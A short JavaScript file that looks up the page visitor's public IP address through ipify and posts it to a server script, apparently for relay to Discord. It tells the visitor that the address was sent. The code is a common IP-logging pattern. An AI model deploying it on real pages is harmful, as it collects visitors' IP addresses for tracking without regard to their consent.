// script.js
function getAndSendIP() {
    // Fetch IP address using a third-party service
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            sendToDiscord(ip);
        })
        .catch(error => {
            console.error('Error fetching IP address:', error);
            displayStatus('Error fetching IP address.');
        });
}

function sendToDiscord(ip) {
    const data = { ip: ip };

    fetch('submit.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Response from server:', data);
        displayStatus('IP address sent to Discord successfully.');
    })
    .catch(error => {
        console.error('Error sending IP address to Discord:', error);
        displayStatus('Error sending IP address to Discord.');
    });
}

function displayStatus(message) {
    const statusElement = document.getElementById('status');
    statusElement.textContent = message;
}
